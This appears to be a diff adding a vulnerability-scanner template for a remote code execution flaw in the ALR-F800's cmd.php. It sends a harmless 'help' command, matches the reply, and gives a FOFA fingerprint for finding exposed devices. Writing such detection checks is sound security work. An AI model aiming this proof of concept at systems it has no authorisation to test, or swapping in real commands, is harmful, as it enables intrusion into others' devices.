@@ -1,0 +1,31 @@
+id: poc-yaml-alr-f800-cmd-php-rce
+info:
+  name: ALR-F800 cmd.php Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  metadata:
+    finger: alr-f800
+    fofa: body="ALR-F800"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cmd.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "cmd=help"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GENERAL COMMANDS"
+          - "Help:"
+          - "Display current settings"
+      - type: word
+        part: header
+        words:
+          - "text/plain"
